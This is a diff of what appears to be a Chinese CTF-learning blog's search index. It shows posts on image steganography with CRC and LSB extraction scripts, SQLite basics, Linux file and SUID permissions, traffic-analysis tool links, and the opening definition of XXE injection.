+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">img = <span class="built_in">open</span>(<span class="string">&#x27;图片的绝对路径&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFFFF</span>):</span><br><span class="line">    stream = img[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + img[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc = binascii.crc32(stream)</span><br><span class="line">    <span class="keyword">if</span> crc == bytes_to_long(img[<span class="number">29</span>:<span class="number">33</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))<span class="comment">#输出高度的十六进制</span></span><br></pre></td></tr></table></figure>
 
-<p>数据库成功创建后可以使用 SQLite 的 .databases 命令来检查它是否在数据库列表中</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlite&gt; .database</span><br><span class="line">main: </span><br></pre></td></tr></table></figure>
-
-<p>打开数据库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Use &quot;.open FILENAME&quot; to reopen on a persistent database.</span><br><span class="line">sqlite&gt; .open sqltest.db</span><br></pre></td></tr></table></figure>
-
-<p>导入和导出数据库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导出</span><br><span class="line">$sqlite3 testDB.db .dump &gt; testDB.sql</span><br><span class="line"># 导入</span><br><span class="line">$sqlite3 testDB.db &lt; testDB.sql</span><br></pre></td></tr></table></figure>
-
-<p>创建表</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlite&gt; create table test(</span><br><span class="line">   ...&gt; id INT PRIMARY KEY     NOT NULL,</span><br><span class="line">   ...&gt; name char(50) NOT NULL</span><br><span class="line">   ...&gt; );</span><br><span class="line">   </span><br><span class="line">sqlite&gt; CREATE TABLE COMPANY(</span><br><span class="line">   ID INT PRIMARY KEY     NOT NULL,</span><br><span class="line">   NAME           TEXT    NOT NULL,</span><br><span class="line">   AGE            INT     NOT NULL,</span><br><span class="line">   ADDRESS        CHAR(50),</span><br><span class="line">   SALARY         REAL</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<h4 id="隐写信息以IDAT块加入图片"><a href="#隐写信息以IDAT块加入图片" class="headerlink" title="隐写信息以IDAT块加入图片"></a>隐写信息以IDAT块加入图片</h4><p>图片的IDAT块是可以存在多个的，这导致了我们可以将隐写信息以IDAT块的形似加入图片。</p>
+<p>可以使用pngcheck对图片进行检测  <a href="https://xz.aliyun.com/t/1836">具体实例看这里</a></p>
+<p>这里不再赘述</p>
+<p>我自己出了一个题可以检验一下  <a href="https://pan.baidu.com/s/1xtG_UmazI6TV_WL1u41Gwg">附件 密码T0MR</a></p>
+<h3 id="三、LSB图片隐写"><a href="#三、LSB图片隐写" class="headerlink" title="三、LSB图片隐写"></a>三、LSB图片隐写</h3><p><a href="https://ctf-wiki.org/misc/picture/png/#lsb">lsb介绍戳这里</a></p>
+<p>在ctf中，最常用于检测lsb隐写的工具为stegsolve    （<a href="http://t0mrvvi1b3t.top/2021/05/03/%E5%B7%A5%E5%85%B7/">这里有</a></p>
+<p>提取rgb最低位脚本–<a href="https://xz.aliyun.com/t/1844">来自这里</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;extracted.bmp&quot;</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width, height = im.size</span><br><span class="line"></span><br><span class="line">extracted_bits = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):<span class="comment">#y，x代表的是图片的高以及宽度，进行一个循环提取</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        r, g, b = pix[(x,y)]</span><br><span class="line">        extracted_bits.append(r &amp; <span class="number">1</span>)</span><br><span class="line">        extracted_bits.append(g &amp; <span class="number">1</span>)</span><br><span class="line">        extracted_bits.append(b &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">extracted_byte_bits = [extracted_bits[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(extracted_bits), <span class="number">8</span>)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;extracted2.bmp&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    <span class="keyword">for</span> byte_bits <span class="keyword">in</span> extracted_byte_bits:</span><br><span class="line">                byte_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> byte_bits)</span><br><span class="line">        byte = <span class="built_in">chr</span>(<span class="built_in">int</span>(byte_str, <span class="number">2</span>))</span><br><span class="line">        out.write(byte)</span><br></pre></td></tr></table></figure>
 
 
 
+<h3 id="四、基于DCT域的JPG图片隐写"><a href="#四、基于DCT域的JPG图片隐写" class="headerlink" title="四、基于DCT域的JPG图片隐写"></a>四、基于DCT域的JPG图片隐写</h3><p><a href="https://ctf-wiki.org/misc/picture/jpg/">关于JPG戳这里</a></p>
+<p>常见关于JPG的隐写方法有 JSteg、JPHide、Outguess、F5等 常用Stegdetect来检测是哪种隐写方式</p>
+<p><a href="https://ctf-wiki.org/misc/picture/jpg/#stegdetect">关于Stegdetect和JPHS戳这里</a>  <a href="https://www.codenong.com/cs106178858/">压缩原理及工具使用戳这里</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Stegdetect</span><br><span class="line">如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识</span><br><span class="line">隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</span><br></pre></td></tr></table></figure>
 
-
-
-
+<h3 id="五、数字水印隐写"><a href="#五、数字水印隐写" class="headerlink" title="五、数字水印隐写"></a>五、数字水印隐写</h3><p><a href="https://www.jianshu.com/p/8a89b6ba5e39">LSB顺序替换嵌入与提取实现</a></p>
+<p><a href="https://github.com/li-xin-yi/graduation-project/tree/master">加强版</a></p>
 ]]></content>
       <categories>
-        <category>web学习</category>
+        <category>Misc</category>
+        <category>图片隐写</category>
       </categories>
-  </entry>
-  <entry>
-    <title>提权</title>
-    <url>/2021/08/03/suid%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
-
-<h3 id="Linux权限介绍"><a href="#Linux权限介绍" class="headerlink" title="Linux权限介绍"></a>Linux权限介绍</h3><h4 id="文件的基本权限"><a href="#文件的基本权限" class="headerlink" title="文件的基本权限"></a>文件的基本权限</h4><p>可以使用<code>ll</code>或<code>ls -l</code>来查看linux下的文件权限</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-rw------- 1 hack hack 384000  6月  2 16:29 789.png</span><br><span class="line">drwxr-xr-x 2 hack hack   4096  6月  2 17:42 examples</span><br><span class="line">-rw------- 1 hack hack   4564  7月  9 11:11 file.png</span><br><span class="line">-rwxrw-rw- 1 hack hack  35141  8月 13  2019 LICENSE</span><br><span class="line">-rw-r--r-- 1 hack hack   4564  7月  9 11:23 output.png</span><br><span class="line">-rwxrw-rw- 1 hack hack  22668  8月 13  2019 PCRT.py</span><br><span class="line">-rwxrw-rw- 1 hack hack   7300  8月 13  2019 README.md</span><br></pre></td></tr></table></figure>
-
-<p>文件列表对应的信息分别为：文件类型、权限、链接数、所属用户、所属用户组、文件大小、最后修改时间、文件名。</p>
-<h5 id="文件类型分类"><a href="#文件类型分类" class="headerlink" title="文件类型分类"></a>文件类型分类</h5><p>Linux一共有7种文件类型（在文件权限前，占一个字符）：</p>
-<ul>
-<li>-：普通文件</li>
-<li>d：目录文件</li>
-<li>l：软链接（类似快捷方式）</li>
-<li>b：块设备文件（如硬盘、光驱等）</li>
-<li>p：管道文件</li>
-<li>c：字符设备文件（如猫等串口设备）</li>
-<li>s：套接口文件/数据接口文件（例如启动一个MySQL服务器时会产生一个mysql.sock文件）</li>
-</ul>
-<h5 id="文件权限分类："><a href="#文件权限分类：" class="headerlink" title="文件权限分类："></a>文件权限分类：</h5><table>
-<thead>
-<tr>
-<th>权限</th>
-<th>对应数字</th>
-<th>对文件</th>
-<th>对目录</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>r</td>
-<td>4</td>
-<td>可读</td>
-<td>可以查询目录下的文件(ls、ll)</td>
-</tr>
-<tr>
-<td>w</td>
-<td>2</td>
-<td>可写</td>
-<td>可<strong>增删改移</strong>该目录下的文件和目录(cp、mv、touch、rm)</td>
-</tr>
-<tr>
-<td>x</td>
-<td>1</td>
-<td>可执行</td>
-<td>可执行但不能运行，可进入目录(cd)</td>
-</tr>
-</tbody></table>
-<p><code>-rwxrw-rw- 1 hack hack   7300  8月 13  2019 README.md</code>以这个为例，第一个字符为<code>-</code>，表明是普通文件，后边紧接着是文件权限：</p>
-<ul>
-<li>rwx：第一组代表文件所有者(即U)权限，这里是root，root对该文件拥有读写执行权限；</li>
-<li>rw-：第二组代表所属组(即G)的权限，这里所属组拥有对该文件读和写的权限；</li>
-<li>rw-：第三组代表其他人(即O)的权限，这里与G的权限一样。</li>
-</ul>
-<h5 id="更改权限的命令"><a href="#更改权限的命令" class="headerlink" title="更改权限的命令"></a>更改权限的命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown命令：用来改变文件或目录的所有者和所属用户组。</span><br><span class="line">chgrp命令：用来改变文件或目录的所属的用户组。</span><br></pre></td></tr></table></figure>
-
-<p>对于文件来说，最高权限是<code>x</code>对于目录则是<code>w</code>；</p>
-<p>对于文件能否删除，首先要对目录具有执行权限，同时对文件也要有可执行权限；</p>
-<p>一般给目录赋予权限0 ，5（r-x），7（rwx），赋予1 ，4， 6都是没有意义的。</p>
-<p>Linux常用权限值：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">600（rw------）：只有root有读写权限；</span><br><span class="line">644（rw-r--r--）：只有root有读写权限；group用户和other用户只有读权限；</span><br><span class="line">755（rwxr-xr-x）：root有读、写、执行权限；group用户和other用户只有读、执行权限。</span><br></pre></td></tr></table></figure>
-
-<h4 id="默认权限"><a href="#默认权限" class="headerlink" title="默认权限"></a>默认权限</h4><p>我们在linux系统中新建一个文件或者目录，那么这个文件或目录会有一个权限，这个权限就是默认权限。这个权限就是靠umask的值来定义的。</p>
-<blockquote>
-<p>umask（权限掩码） 就是指定当前用户在建立文件或目录时候的权限默认值。当新文件被创建时，其最初的权限由文件创建掩码决定。用户每次登录系统时，umask命令都被执行， 并自动设置掩码mode来限制新文件的权限。用户可以通过再次执行umask命令来改变默认值，新的权限将会把旧的覆盖掉。</p>
-</blockquote>
-<p>可以在终端输入<code>umask</code>来查看系统中的文件默认权限</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost local]# umask</span><br><span class="line">0022</span><br></pre></td></tr></table></figure>
-
-<p>0022：</p>
-<p>​    第一个0：文件特殊权限 ；后边的022：文件默认权限</p>
-<p>下面创建以一个文件和目录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀hack)-[~/桌面/123]</span><br><span class="line">└─# mkdir 321</span><br><span class="line">                                                                                                 </span><br><span class="line">┌──(root💀hack)-[~/桌面/123]</span><br><span class="line">└─# touch 1.txt</span><br><span class="line">                                                                                                 </span><br><span class="line">┌──(root💀hack)-[~/桌面/123]</span><br><span class="line">└─# ll</span><br><span class="line">总用量 4</span><br><span class="line">-rw-r--r-- 1 root root    0  8月  3 20:04 1.txt</span><br><span class="line">drwxr-xr-x 2 root root 4096  8月  3 20:04 321</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>可以看到文件默认权限是644，目录的默认权限是755</p>
-<p>文件默认权限的特点：</p>
-<p>​    1、文件默认不能建立为执行权限，必须手工赋予执行权限，所以文件的默认权限最大为666.</p>
-<p>​    2、默认权限要换算成对应的字母权限再相减而不是数字。</p>
-<p>​    3、建立文件或目录之后的默认权限，为666减去umask的值。</p>
-<p>计算方式：</p>
-<p>​    1、文件默认最大权限666，umask=022</p>
-<p>​        -rw-rw-rw- 减去 —–w–w- 等于 -rw-r–r– （644）</p>
-<p>​    2、目录默认最大权限666，umask=022</p>
-<p>​        drwxr-xr-x 减去 d—-w–w-等于 drwxr-xr-x（644）</p>
-<p>其实是字符做了一个与非运算，要想修改umask的默认值，需要去修改环境配置文件<code>/etc/profile</code></p>
-<h4 id="文件的特殊权限：SUID、SGID、SBIT"><a href="#文件的特殊权限：SUID、SGID、SBIT" class="headerlink" title="文件的特殊权限：SUID、SGID、SBIT"></a>文件的特殊权限：SUID、SGID、SBIT</h4><p>Linux下除了<code>rwx</code>外还有<code>s</code>和<code>t</code>两个特殊权限，当<code>s</code>权限出现在所有者的x权限上时就是<code>SUID</code>；出现在所有组上时，就是<code>SGID</code>;出现在其他用户上时，就是<code>SBIT</code>.</p>
-<h5 id="SUID-SET-USER-ID"><a href="#SUID-SET-USER-ID" class="headerlink" title="SUID: SET USER ID"></a>SUID: SET USER ID</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、只有具有x权限的二进制程序才能设定SUID权限;</span><br><span class="line">2、命令执行者要对该程序拥有x权限;</span><br><span class="line">3、命令执行者只在程序执行的过程中有效，即在执行该程序时才临时拥有root身份。</span><br></pre></td></tr></table></figure>
-
-<p>赋权方式：(<code>root</code>用户才能设置)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 4755 [文件名]</span><br><span class="line">chmod u+s [文件名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">取消权限</span></span><br><span class="line">chmod 755 [文件名]</span><br><span class="line">chmod u-s [文件名]</span><br></pre></td></tr></table></figure>
-
-<p>赋权时，有x权限的才能正常赋权，替代显示为s，没有x权限的不能正常赋权，替代显示为S，S表示权限不能正确使用，因为其本身就没有可执行权限。</p>
-<h5 id="SGID-Set-Group-id"><a href="#SGID-Set-Group-id" class="headerlink" title="SGID: Set Group id"></a>SGID: Set Group id</h5><p><code>SGID</code>权限同<code>SUID</code>一样，只是<code>SUID</code>作用于所有者，而<code>SGID</code>作用于所有组，<code>SGID</code>作用在二进制程序上时，执行权限的程序时此用户将继承此程序的所属组权限，作用于目录上时，此文件夹下所有用户新建文件都自动继承此目录的用户组。同样在设置<code>SGID</code>的文件后，其组权限位上的可执行权限<code>x</code>会变成<code>s</code>,如果变成了<code>S</code>，说明其组权限位上没有可执行权限，设置<code>SGID</code>无效。</p>
-<p>赋权方式：(<code>root</code>用户才能设置)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 2755 [文件名]</span><br><span class="line">chmod g+s [文件名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">取消权限</span></span><br><span class="line">chmod 755 [文件名]</span><br><span class="line">chmod g-s [文件名]</span><br></pre></td></tr></table></figure>
-
-<h5 id="SBIT-Sticky-Bit"><a href="#SBIT-Sticky-Bit" class="headerlink" title="SBIT: Sticky Bit"></a>SBIT: Sticky Bit</h5>]]></content>
-      <categories>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-      </tags>
   </entry>
   <entry>
     <title>结合ctfshow学习php反序列化</title>
@@ -1502,78 +1592,6 @@
       </tags>
   </entry>
   <entry>
-    <title>有关图片隐写的学习</title>
-    <url>/2021/07/22/%E5%85%B3%E4%BA%8E%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
-    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
-
-<h3 id="一、附加式图片隐写"><a href="#一、附加式图片隐写" class="headerlink" title="一、附加式图片隐写"></a>一、附加式图片隐写</h3><p>这种隐写方式通常是使用某种方式在载体文件中直接附加上要被隐写的信息。</p>
-<p>在CTF中，这类图片隐写大概有两种经典方式：</p>
-<p>​        1、直接附加字符串</p>
-<p>​        2、图种形式的隐写</p>
-<h4 id="附加字符串"><a href="#附加字符串" class="headerlink" title="附加字符串"></a>附加字符串</h4><p>这种类型可以用strings命令来查找</p>
-<p>关于strings命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</span><br><span class="line"></span><br><span class="line">用法：strings [选项] [文件]</span><br><span class="line"> 打印 [文件] (默认为标准输入) 中可打印的字符串</span><br><span class="line"> 选项为：</span><br><span class="line">-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段</span><br><span class="line">-f –print-file-name：在显示字符串前先显示文件名</span><br><span class="line">-t --radix&#x3D;&#123;o,d,x&#125; ：输出字符的位置，基于八进制，十进制或者十六进制</span><br><span class="line">-e --encoding&#x3D;&#123;s,S,b,l,B,L&#125; ：选择字符大小和排列顺序:s &#x3D; 7-bit, S &#x3D; 8-bit, &#123;b,l&#125; &#x3D; 16-bit, &#123;B,L&#125; &#x3D; 32-bit</span><br><span class="line"></span><br><span class="line">-d --data                 Only scan the data sections in the file</span><br><span class="line">-n --bytes&#x3D;[number]       Locate &amp; print any NUL-terminated sequence of at</span><br><span class="line">-&lt;number&gt;                   least [number] characters (default 4).</span><br><span class="line">-w --include-all-whitespace Include all whitespace as valid string characters</span><br><span class="line">-o                        An alias for --radix&#x3D;o</span><br><span class="line">-T --target&#x3D;&lt;BFDNAME&gt;     Specify the binary file format</span><br><span class="line">-s --output-separator&#x3D;&lt;string&gt; String used to separate strings in output.</span><br><span class="line">@&lt;file&gt;                   Read options from &lt;file&gt;</span><br><span class="line">-h --help                 Display this information</span><br><span class="line">-v -V --version           Print the program&#39;s version number</span><br><span class="line">strings：支持的目标： elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86-64 pe-bigobj-x86-64 pe-i386 srec symbolsrec verilog tekhex binary ihex plugin</span><br></pre></td></tr></table></figure>
-
-<p>例如<code>strings 1.jpg |grep flag</code>查找1.jpg中可打印字符串中含有flag的字符串</p>
-<p>这种类型一般是将信息插到图片的尾部，少数是插到中间。</p>
-<h4 id="图种形式的隐写"><a href="#图种形式的隐写" class="headerlink" title="图种形式的隐写"></a>图种形式的隐写</h4><p>图种这是一种以图片文件为载体，通常为jpg格式的图片，然后将zip等压缩包文件附加在图片文件后面。因为操作系统识别的过程中是，从文件头标志，到文件的结束标志位，当系统识别到图片的结束标志位后，默认是不再继续识别的，所以我们在通常情况下只能看到它是只是一张图片。</p>
-<p>利用Linux中的binwalk命令即可识别此图片文件都包含了什么文件    查询命令<code>binwalk 1.jpg</code>分离命令<code>binwalk -e 1.jpg</code></p>
-<p>分离文件也可用foremost <code>foremost 1.jpg</code></p>
-<p>binwalk可以自动识别出图片中藏的zip文件以及显示出偏移，binwalk命令还可以解压zilb数据</p>
-<p>不想用命令的话可以用16进制编辑器打开图片文件，手动提取出压缩包，这就要求了要熟悉各种常见文件的文件头标识和结束标识（自行百度</p>
-<h3 id="二、基于文件结构的图片隐写"><a href="#二、基于文件结构的图片隐写" class="headerlink" title="二、基于文件结构的图片隐写"></a>二、基于文件结构的图片隐写</h3><p>主要介绍关于png图片的隐写，<a href="https://ctf-wiki.org/misc/picture/png/">关于png文件结构戳这里</a></p>
-<p>重点了解一下png图片文件头数据块以及png图片IDAT块，这次的隐写也是以这两个地方为基础的。</p>
-<p><strong>png图片文件头数据块（IHDR）</strong></p>
-<p>IHDR中，包括了图片的宽，高，图像深度，颜色类型，压缩方法等</p>
-<p><strong>IDAT数据块</strong></p>
-<p>它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。这是一个可以存在多个数据块类型的数据块。它的作用就是存储着图像真正的数据。因为它是可以存在多个的，所以即使我们写入一个多余的IDAT也不会多大影响肉眼对图片的观察</p>
-<h4 id="高度被修改导致的隐写"><a href="#高度被修改导致的隐写" class="headerlink" title="高度被修改导致的隐写"></a>高度被修改导致的隐写</h4><p>图片的高度，宽度的值存放于PNG图片的文件头数据块，那么我们就可以通过修改PNG图片的高度值，来对部分信息进行隐藏的。</p>
-<p>辨别：图片在Windows系统下能正常显示而Linux系统不能正常显示，这时候就要考虑图片高度是否被修改了</p>
-<p>推荐一手010editor（一个16进制编辑器），可以运行图片模板，运行模板后可以轻易的找到图片的各个数据块位置及内容</p>
-<p>知道高度被修改后可以直接改大高度也可以用脚本根据crc校验值爆破出来</p>
-<p>脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">img = <span class="built_in">open</span>(<span class="string">&#x27;图片的绝对路径&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFFFF</span>):</span><br><span class="line">    stream = img[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + img[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc = binascii.crc32(stream)</span><br><span class="line">    <span class="keyword">if</span> crc == bytes_to_long(img[<span class="number">29</span>:<span class="number">33</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))<span class="comment">#输出高度的十六进制</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="隐写信息以IDAT块加入图片"><a href="#隐写信息以IDAT块加入图片" class="headerlink" title="隐写信息以IDAT块加入图片"></a>隐写信息以IDAT块加入图片</h4><p>图片的IDAT块是可以存在多个的，这导致了我们可以将隐写信息以IDAT块的形似加入图片。</p>
-<p>可以使用pngcheck对图片进行检测  <a href="https://xz.aliyun.com/t/1836">具体实例看这里</a></p>
-<p>这里不再赘述</p>
-<p>我自己出了一个题可以检验一下  <a href="https://pan.baidu.com/s/1xtG_UmazI6TV_WL1u41Gwg">附件 密码T0MR</a></p>
-<h3 id="三、LSB图片隐写"><a href="#三、LSB图片隐写" class="headerlink" title="三、LSB图片隐写"></a>三、LSB图片隐写</h3><p><a href="https://ctf-wiki.org/misc/picture/png/#lsb">lsb介绍戳这里</a></p>
-<p>在ctf中，最常用于检测lsb隐写的工具为stegsolve    （<a href="http://t0mrvvi1b3t.top/2021/05/03/%E5%B7%A5%E5%85%B7/">这里有</a></p>
-<p>提取rgb最低位脚本–<a href="https://xz.aliyun.com/t/1844">来自这里</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;extracted.bmp&quot;</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width, height = im.size</span><br><span class="line"></span><br><span class="line">extracted_bits = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):<span class="comment">#y，x代表的是图片的高以及宽度，进行一个循环提取</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        r, g, b = pix[(x,y)]</span><br><span class="line">        extracted_bits.append(r &amp; <span class="number">1</span>)</span><br><span class="line">        extracted_bits.append(g &amp; <span class="number">1</span>)</span><br><span class="line">        extracted_bits.append(b &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">extracted_byte_bits = [extracted_bits[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(extracted_bits), <span class="number">8</span>)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;extracted2.bmp&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    <span class="keyword">for</span> byte_bits <span class="keyword">in</span> extracted_byte_bits:</span><br><span class="line">                byte_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> byte_bits)</span><br><span class="line">        byte = <span class="built_in">chr</span>(<span class="built_in">int</span>(byte_str, <span class="number">2</span>))</span><br><span class="line">        out.write(byte)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="四、基于DCT域的JPG图片隐写"><a href="#四、基于DCT域的JPG图片隐写" class="headerlink" title="四、基于DCT域的JPG图片隐写"></a>四、基于DCT域的JPG图片隐写</h3><p><a href="https://ctf-wiki.org/misc/picture/jpg/">关于JPG戳这里</a></p>
-<p>常见关于JPG的隐写方法有 JSteg、JPHide、Outguess、F5等 常用Stegdetect来检测是哪种隐写方式</p>
-<p><a href="https://ctf-wiki.org/misc/picture/jpg/#stegdetect">关于Stegdetect和JPHS戳这里</a>  <a href="https://www.codenong.com/cs106178858/">压缩原理及工具使用戳这里</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Stegdetect</span><br><span class="line">如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识</span><br><span class="line">隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</span><br></pre></td></tr></table></figure>
-
-<h3 id="五、数字水印隐写"><a href="#五、数字水印隐写" class="headerlink" title="五、数字水印隐写"></a>五、数字水印隐写</h3><p><a href="https://www.jianshu.com/p/8a89b6ba5e39">LSB顺序替换嵌入与提取实现</a></p>
-<p><a href="https://github.com/li-xin-yi/graduation-project/tree/master">加强版</a></p>
-]]></content>
-      <categories>
-        <category>Misc</category>
-        <category>图片隐写</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>流量分析</title>
-    <url>/2021/08/05/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
-
-<h3 id="流量包修复"><a href="#流量包修复" class="headerlink" title="流量包修复"></a>流量包修复</h3><p>在线网站：<a href="https://f00l.de/hacking/pcapfix.php">https://f00l.de/hacking/pcapfix.php</a></p>
-<p>github项目：<a href="https://github.com/Rup0rt/pcapfix/tree/devel">https://github.com/Rup0rt/pcapfix/tree/devel</a></p>
-<h3 id="web流量分析"><a href="#web流量分析" class="headerlink" title="web流量分析"></a>web流量分析</h3><p>WEB数据包分析的题目主要出现WEB攻击行为的分析上， 典型的WEB攻击行为有：WEB扫描、后台目录爆破、后台账号爆破、WEBSHELL上传、SQL注入等。</p>
-<h4 id="web扫描分析"><a href="#web扫描分析" class="headerlink" title="web扫描分析"></a>web扫描分析</h4><p>常见扫描器特征分析：<a href="https://cn-sec.com/archives/309388.html">https://cn-sec.com/archives/309388.html</a></p>
-]]></content>
-      <categories>
-        <category>Misc</category>
-        <category>流量分析</category>
-      </categories>
-  </entry>
-  <entry>
     <title>工具下载</title>
     <url>/2021/05/03/%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
@@ -1605,260 +1623,18 @@
       </categories>
   </entry>
   <entry>
-    <title>XXE</title>
-    <url>/2021/07/18/xxe/</url>
+    <title>流量分析</title>
+    <url>/2021/08/05/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
 
-<h3 id="一、XXE-是什么"><a href="#一、XXE-是什么" class="headerlink" title="一、XXE 是什么"></a><strong>一、XXE 是什么</strong></h3><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
-<h3 id="二、关于XML"><a href="#二、关于XML" class="headerlink" title="二、关于XML"></a><strong>二、关于XML</strong></h3><p><a href="https://www.runoob.com/xml/xml-intro.html">有关XML格式点这里</a></p>
-<h4 id="关于DTD"><a href="#关于DTD" class="headerlink" title="关于DTD"></a>关于DTD</h4><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。</p>
-<p>一般认为有两种引用或声明方式：</p>
-<ul>
-<li>内部DTD：对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</li>
-<li>外部DTD：对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</li>
-</ul>
-<p><strong>内部实体</strong></p>
